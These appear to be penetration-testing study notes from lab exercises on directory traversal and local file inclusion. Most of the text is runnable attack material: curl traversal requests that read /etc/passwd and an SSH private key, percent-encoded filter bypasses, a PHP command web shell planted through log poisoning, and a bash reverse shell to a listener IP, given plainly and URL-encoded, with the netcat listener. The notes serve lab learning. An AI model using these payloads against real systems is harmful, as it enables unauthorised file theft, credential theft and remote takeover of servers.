## Directory Traversal

Use `../` to navigate 1 directory backward from your current directory. If you string them together and use `cat`, you can go to root and navigate from there:

```bash
cat ../../../../../../../../../../../etc/passwd
```

### Identifying and Exploiting Directory Traversals
On Linux, `/var/www/html/` is often used as the web root. 

To start identifying all the potential directory traversals, first find all the URLS on a webpage by hovering over all buttons and links.

To make this easier, run this in the browser console on the website. It will display the URL, anchor text and whether the URL refers to an external website:
```JavaScript
const results = [
    ['Url', 'Anchor Text', 'External']
];
var urls = document.getElementsByTagName('a');
for (urlIndex in urls) {
    const url = urls[urlIndex]
    const externalLink = url.host !== window.location.host
    if(url.href && url.href.indexOf('://')!==-1) results.push([url.href, url.text, externalLink]) // url.rel
}
const csvContent = results.map((line)=>{
    return line.map((cell)=>{
        if(typeof(cell)==='boolean') return cell ? 'TRUE': 'FALSE'
        if(!cell) return ''
        let value = cell.replace(/[\f\n\v]*\n\s*/g, "\n").replace(/[\t\f ]+/g, ' ');
        value = value.replace(/\t/g, ' ').trim();
        return `"${value}"`
    }).join('\t')
}).join("\n");
console.log(csvContent)
```

Example:

URL: `http://mountaindesserts.com/meteor/index.php?page=admin.php`

You can see this uses PHP and a parameter called "page". This is probably used to display different pages too, e.g. "page=login.php". 

PHP uses _$_GET_ to manage variables via a GET request

For the above example, the URL displays a parameter and a value. Try the value as a path, and maybe you see the same page! This indicates that the web application includes information from the "page" parameter and shows it under the "admin" link. I.e. the `page=` parameter takes input and displays it. Normally, this would be a webpage file, but you can use this to navigate the directories! E.g.:

`http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`

To display list of users.

Can potentially be used to display SSH private key and then connect using this key, e.g.:
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

#### Windows
Instead of /etc/passwd, default is C:\Windows\System32\drivers\etc\hosts, since it is readable by all users.

More difficult, since no equivalent to /etc/passwd means no user list and no indication of where to check for SSH keys.

For IIS servers, always check:
- C:\inetpub\logs\LogFiles\W3SVC1\
- C:\inetpub\wwwroot\web.config
- Documentation of IIS to see whether there are any other potentially useful files.

For Windows IIS, it the "payload" **usuallly** does not change, e.g. from / to \.
```bash
curl --path-as-is 192.168.202.193:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../Users/install.txt -v
```
Worked to display file located in C:\Users\install.txt


### Encoding Special Characters

Because `../` is a known way to abuse web applications, it is often filtered. We can use URL encoding/percent encoding to bypass this. Specifically: ASCII encoding: https://www.w3schools.com/tags/ref_urlencode.asp


| Character | From Windows 1252 | From UTF-8 |
| ----------|-------------------|------------|
| `.`| %2E |	%2E |
| `/`	| %2F |	%2F |
| ` ` | %20 | %20 | 

E.g.:
```bash
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
or
```bash
curl http://192.168.50.16/cgi-bin/%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd
```

This worked for encoded:
```bash
curl http://192.168.208.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/install.txt -v
```

## File Inclusion Vulnerabilities
LFI =/= directory traversal!

With LFI, you can include a file in the application's running code. Rather than reading (i.e. directory traversal), you can execute a local/remote file!

### Local File Inclusion (LFI)

LFI will work if we can write content and that content will be executed within the running code.

E.g.: Log poisoning - try to write executable code to log file (e.g. /var/log/apache2/access.log for Apache)

First: find out what is controlled by us (i.e., what can we send to the logs?)
- Read documentation
- Use directory traversal to display the file.
E.g.:
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
If the User Agent is included, we can modify this to include some PHP code:
```PHP
<?php echo system($_GET['cmd']); ?>
```
Now, this was written to access.log. If we go to this file via the directory traversal, we can execute the PHP. In this case, we also need to add an extra parameter to the URL to enter a command into the PHP:
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps
```
We use `&` as a delimiter since we want to pass values to 2 different parameters. We do not want to include anything in the user agent, in case it poisons the log file again.

Sometimes we may want to include spaces in our command. We can encode them using `%20`, E.g.: 
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-al
```
Now, we can use this and encode this to (attempt to) obtain a reverse shell:

In Bash, it would look like this:
```bash
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```
BUT: the PHP _system_ function may execute using the Bourne shelll (sh). We can try to force it to use bash by using:
```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
Encoded, it would become this:
```bash
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```
You can also use this for custom commands: https://gchq.github.io/CyberChef/#recipe=URL_Encode(true).

Now the full request would be:
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

Start a netcat listener on the right port:
```bash
nc -nvlp 4444
```
And you should get a shell!

#### Windows
For Windows, log files are located in application specific paths instead of all in 1 file. E.g. for XAMP the Apache logs are located in C:\xampp\apache\logs\.

We can use many other languages that just PHP.


